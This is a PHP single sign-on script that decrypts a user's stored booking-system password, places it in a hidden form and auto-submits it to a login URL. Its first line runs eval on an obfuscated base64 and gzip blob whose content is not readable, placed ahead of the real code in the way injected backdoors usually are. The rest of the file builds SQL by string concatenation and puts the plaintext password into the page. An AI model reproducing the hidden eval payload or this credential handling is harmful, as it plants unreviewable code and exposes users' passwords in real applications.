<?php
eval(gzuncompress(gzinflate(base64_decode('AXEAjv942tPX19JS8K0MDvRRKE4tKcnMSy9W0NLS1+flUklJii9OLSpLLVJQULBVUMqtLC7MMdU1VLKGyOUl5qYqKEDk8vJzkxKLU4EKYLKlQK1gFUDZnPz0zDwkuYLE4uLy/KIUsKn5JSmpIIFUkCwAmYgq2g=='))));

//// Cl� et cryptage		
require_once "../includes/global.inc.php";
require "../commun/sso/crypt_decrypt.php";
require "token/cle.php";
require "url.php";
		
$corpsql_grr = "FROM `gt_sso` WHERE `id_utilisateur` = '".$_SESSION['user']['id_utilisateur']."'";
$user_grr = db_valeur("SELECT `user_grr` ".$corpsql_grr."");
$pass_grr = db_valeur("SELECT `pass_grr` ".$corpsql_grr."");
	
echo "<div style=\"height:100%; width:100%; background-color:RGB(255,255,255); z-index:99 ;position:absolute; top:0; left:0px;\"></div>";
echo "<form name=\"redirect\" action=\"".$url."".$login."\" method=\"post\" id=\"form_grr\">";
echo "<input type=\"hidden\" id=\"login\" name=\"login\" value=\"".$user_grr."\"/>";
echo "<input name=\"password\" type=\"password\" id=\"passe\"  value=\"".Decrypte($pass_grr,$Clegrr)."\" />";
echo "<input type=\"submit\" name=\"submit_grr\" height=\"0\" width=\"0\" />";
echo "</form>";

echo "<script language=\"JavaScript\">";
echo "document.redirect.submit();";
echo "</script>";
?>